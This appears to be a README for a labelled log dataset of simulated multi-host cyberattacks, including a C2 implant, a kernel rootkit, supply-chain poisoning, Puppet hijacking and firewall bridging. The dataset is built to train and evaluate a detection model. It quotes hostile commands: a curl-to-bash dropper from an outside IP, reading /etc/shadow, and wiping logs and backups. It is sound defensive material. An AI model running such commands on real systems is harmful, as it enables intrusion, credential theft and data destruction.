# 🛡️ Attack Scenarios & Log Training Dataset

This directory contains simulated cyberattack scenarios and their annotated log extractions, serving as the ground truth benchmark for evaluating and fine-tuning the **CyberAgent** model.

---

## 📊 1. Overview & Global Statistics

Each scenario is parsed and partitioned into three strictly disjoint classes:
- 🚨 **Offensive (`alert`)**: Confirmed active cyberattack actions (e.g., reverse shell execution, ransomware execution, private CA key theft, kernel rootkit loading, malicious cron injection).
- ⚠️ **Suspicious (`suspicious`)**: Real behavioral anomalies and weak security signals (e.g., repeated authentication failures, account enumeration, interactive `sudo` executions, SSH `[preauth]` anomalies).
- 🟢 **Benign (`clear`)**: Legitimate system daemon operations guaranteed to have zero keyword/entity overlap with attack artifacts (e.g., background cron jobs, `systemd`, `apache2`, `puppet`, `php-fpm`).

### Breakdown by Scenario

| Scenario | Target Architecture | Offensive (Alert) | Suspicious | Benign (Clear) | Total Chunks |
| :--- | :--- | :---: | :---: | :---: | :---: |
| **`scenario_2_cron_auto`** | `videoserver` (ZoneMinder C2) | **6** | **37** | **66** | **109** |
| **`scenario_2_rootkit_auto`** | `videoserver` (Kernel Rootkit) | **6** | **37** | **67** | **110** |
| **`scenario_3_ssh_apt_auto`** | Multi-nodes (`inetfw`, `reposerver`, `linuxshare`) | **15** | **31** | **70** | **116** |
| **`scenario_3_vnc_puppet_auto`** | Multi-nodes (`inetfw`, `puppetmaster`, `reposerver`) | **7** | **30** | **69** | **106** |
| **`scenario4_auto`** | Multi-nodes (`inetfw`, `corpdns`, `linuxshare`, `reposerver`) | **9** | **29** | **76** | **114** |
| **TOTAL** | **5 Multi-Host Scenarios** | **43 (8%)** | **164 (30%)** | **348 (62%)** | **555 Chunks** |

---

## 🔍 2. Detailed Scenario Descriptions

---

### 📌 Scenario 2.1: Cron Backdoor (`scenario_2_cron`)
- **Initial Vector**: Exploitation of a web vulnerability on the ZoneMinder surveillance server (`videoserver`).
- **Attack Flow**:
  1. **Initial Access & Foothold**: Deployment and execution of the Sliver C2 implant (`superimplant` / `zmcontroller`).
  2. **Persistence**: Creation of a persistent cron job in `/etc/cron.d/` scheduled to regularly trigger the control binary.
  3. **Privilege Escalation & Discovery**: User account enumeration and password hash dumping via `cat /etc/shadow`.
- **Key Extractions**:
  - *Alert*: Malicious `/etc/cron.d/` injection, execution of `superimplant`, `cat /etc/shadow`.
  - *Suspicious*: PAM authentication failures, abnormal SSH session disconnects, account discovery.
  - *Benign*: ZoneMinder daemons (`zmdc.pl`, `zmwatch.pl`), `logrotate` executions, routine system cron sessions.

---

### 📌 Scenario 2.2: Kernel Rootkit & Exfiltration (`scenario_2_rootkit`)
- **Initial Vector**: Application compromise and local privilege escalation.
- **Attack Flow**:
  1. **Defense Evasion (Rootkit)**: Insertion of a stealth kernel module (`insmod selinux.so.3` / kernel rootkit) to hide malicious processes and files.
  2. **Credential Access**: Extraction of sensitive files and password hashes.
  3. **Data Exfiltration**: Covert data synchronization and exfiltration to the attacker machine via `rsync` over SSH.
  4. **Indicator Removal**: Targeted wiping of system activity logs (`rm -rf /var/log/*`).
- **Key Extractions**:
  - *Alert*: Stealth module loading (`insmod`), covert `rsync` exfiltration, deletion of `auditd/syslog` logs.
  - *Suspicious*: SSH `[preauth]` failure spikes, interactive `sudo` executions, network discovery requests.
  - *Benign*: Periodic filesystem maintenance, standard system file access, routine network daemons.

---

### 📌 Scenario 3.1: Multi-Host SSH APT & Ransomware (`scenario_3_ssh_apt`)
- **Initial Vector**: SSH brute-force attack on gateway `inetfw` followed by lateral pivoting.
- **Attack Flow (4-Stage APT Campaign)**:
  1. **Penetration & Reconnaissance**: Compromise of `inetfw`, lateral pivot to Debian package repository server `reposerver`.
  2. **Critical Credential Theft**: Theft of Puppet Certificate Authority private key (`ca_key.pem`) and shared healthcheck script (`/media/share/healthcheck_cron.sh`).
  3. **Supply Chain Poisoning**:
     - Decompression of the official Debian package `healthcheckd_1.0-1_amd64.deb` (`dpkg-deb -R`).
     - Backdoor injection into the post-installation script (`postinst`).
     - Repackaging of the poisoned `.deb` (`dpkg-deb -b`) and updating repository metadata.
  4. **C2 Execution & Ransomware**:
     - Automated package rollout on `linuxshare` triggered via Puppet/Cron.
     - Web dropper download and execution (`curl http://192.42.1.174:8888/install.sh | bash`) spawning an interactive reverse shell.
     - Deployment and execution of **DoNotCry** ransomware: encryption of image storage (`/media/data/Images/*.png.donotcry`).
     - Irreversible wiping of system backups (`rm -rf /var/backups/*`).
- **Key Extractions**:
  - *Alert* (15 chunks): Theft of `ca_key.pem`, `dpkg-deb -R` unpacking, cron dropper payload, download and launch of `donotcry`, ransomware file renaming/encryption, `rm -rf /var/backups/*`.
  - *Suspicious*: SSH authentication sequences, session switching, directory hierarchy discovery.
  - *Benign*: Legitimate Puppet agent runs, Apache web server queries, `netplan` interface reconfigurations.

---

### 📌 Scenario 3.2: VNC Brute-Force & Puppet Manifest Hijacking (`scenario_3_vnc_puppet`)
- **Initial Vector**: Discovery and brute-force attack against remote desktop VNC service on `inetfw`.
- **Attack Flow**:
  1. **Initial Access**: Hijacking of graphical desktop session on the gateway.
  2. **Pivot to Puppet Infrastructure**: Lateral movement targeting `puppetmaster`.
  3. **Puppet Code Injection**: Alteration of Puppet manifests (`site.pp` / configuration modules) to automatically distribute a backdoor script across all managed nodes.
  4. **Distributed Persistence & Execution**: Deployment of a persistent scheduled agent triggered periodically by client Puppet daemons.
- **Key Extractions**:
  - *Alert*: Writing and tampering with malicious Puppet manifests, distributed cron injection, payload execution.
  - *Suspicious*: Bursts of failed VNC/SSH connections, system information discovery (`whoami`/`uname`).
  - *Benign*: Clean Puppet agent synchronizations, system daemons, `auditd` heartbeats.

---

### 📌 Scenario 4: Port-Knocking, Service Masquerading & Firewall Bridging (`scenario_4`)
- **Initial Vector**: Port-knocking trigger (`knock-cli`), covert archive staging, and SSH foothold on `inetfw`.
- **Attack Flow**:
  1. **Backdoor Staging & Masquerading**: Transfer of `auditf.tar.gz` archive to `/tmp/`, extraction into `/usr/bin` disguised as an audit tool (`auditf`, `system-verify.sh`).
  2. **Persistence via Systemd Masquerade**: Creation and registration of a persistence service `auditf.service` (`systemctl enable/start auditf.service`) executing the Sliver implant `sliver1` at boot.
  3. **Firewall Bridging (Network Boundary Crossing)**:
     - Remote execution via Sliver C2 session modifying Shorewall rules (`sed -i ... /etc/shorewall/rules`) to open SSH port 22 between the DMZ and the internal LAN (`$LINUXSHARE`).
     - Live reload of the firewall configuration (`shorewall reload`).
  4. **Lateral Movement to Internal LAN**: Direct interactive SSH connection from the DMZ to `linuxshare.attackbed.local` through the created firewall hole.
- **Key Extractions**:
  - *Alert* (9 chunks): Decompression of masqueraded archive `auditf.tar.gz`, archive cleanup, systemd daemon-reload, service enablement (`systemctl enable auditf.service`), firewall rule reload (`shorewall reload`), lateral SSH connection to `linuxshare`.
  - *Suspicious*: Interactive SSH sessions, privileged `sudo` calls, system/network discovery requests.
  - *Benign*: Routine DNS resolution traffic (`corpdns`), periodic system maintenance, clean network flows.

---

## 🗂️ 3. Directory & File Structure

Each scenario output directory (e.g., `scenario4_auto/`) is structured as follows:

```text
scenario4_auto/
├── scenario_4_offensive.log    # Alert chunks (Confirmed offensive attack actions)
├── scenario_4_suspicious.log   # Suspicious chunks (Real weak signals & anomalies)
├── scenario_4_benign.log       # Benign/Clear chunks (Clean system activity, zero overlap)
└── ground_truth.json           # Comprehensive metadata, MITRE ATT&CK mapping & ground truth labels
```

### `ground_truth.json` Schema Example

```json
{
  "scenario_4_off_005": {
    "log_file": "scenario_4_offensive.log",
    "source_host": "inetfw",
    "log_type": "auditd",
    "status": "alert",
    "category": "security",
    "mitre_id": "T1543.002",
    "mitre_technique_name": "Create or Modify System Process: Systemd Service",
    "observed_intent": "offensive_create_or_modify_system_process",
    "confidence": "high",
    "summary": "Observed offensive execution for sudo systemctl enable auditf.service (T1543.002)."
  }
}
```

---

## ⚙️ 4. Automated Extraction Pipeline (`tools/scenario_extractor.py`)

The extraction pipeline is fully autonomous, generic, and reproducible:
- **Input**: Raw scenario directory (containing `attacker/logs/attackmate.json` and victim host log folders `<victim>/logs/log/...`).
- **Output**: The 3 partitioned log files and the accompanying `ground_truth.json`.
- **Quality Guarantees**:
  - Strict anti-overlap filtering using word boundaries (`\b`) and offensive entity blacklists for the benign class.
  - Intent capping (`--max_per_intent 5`) to prevent repetitive logs (e.g., PAM or cron spam) from skewing the class balance.
  - Exclusion of background system daemons and dynamic libraries to eliminate false positives in alert logs.

### Running Extraction on a Scenario:

```bash
# Example for Scenario 4
python3 tools/scenario_extractor.py \
  --scenario data/logs_training_data/scenario_4 \
  --output data/logs_training_data/scenario4_auto \
  --max_per_intent 5
```
